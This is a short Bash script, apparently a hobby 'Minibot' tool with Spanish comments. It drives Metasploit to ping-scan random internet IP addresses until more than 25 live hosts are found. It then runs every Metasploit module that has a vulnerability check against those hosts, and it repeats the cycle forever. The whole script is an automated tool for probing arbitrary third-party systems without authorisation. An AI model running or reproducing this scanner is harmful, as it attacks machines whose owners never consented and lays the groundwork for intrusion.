# Escanea IP aleatorias para descubrir Hosts activos
# Prueba más de 1.400 exploits con cada host
# En grupos de más de 25 hosts activos

# Service postgresql start && su msf msfdb init
banner () {
	clear
	echo " "
	echo "Minibot 0.1 - Copyleft("$'\u0254'") 2019 Badbot Corporation. All rigths freed."
	echo " "
	echo " "
}


host_discovery () {
	echo "Host discovery:"
	touch hosts.csv
	while [ "$(wc -l hosts.csv | cut -d " " -f 1)" -le 26 ]; do
	msfconsole -x "db_nmap -sn -T4 -iR 250 ;\
			hosts -o hosts.csv ;\
			exit" > /dev/null 2>&1
	echo "$(tail -n +2 hosts.csv | wc -l | cut -d " " -f 1) Hosts up."
	done
}

checkploits () {
	echo "Checking exploits"
	msfconsole -x "search check:yes -o checkploits.csv ;\
		exit" > /dev/null 2>&1
	checkline=2
	total_check=$(wc -l checkploits.csv | cut -d " " -f 1)
	while [ $checkline -le $total_check ]; do
		checkploit=$(head -$checkline checkploits.csv | tail -1 | cut -d "," -f 2 | tr -d '"')
		banner
		echo "Checking "$checkploit":"
		msfconsole -x "use $checkploit ;\
		hosts -R ;\
		check ;\
		exit"
		((checkline++))
	done

}

while true ; do
banner
host_discovery
banner
checkploits
msfconsole -x "hosts -d"
rm hosts.csv checkploits.csv
done

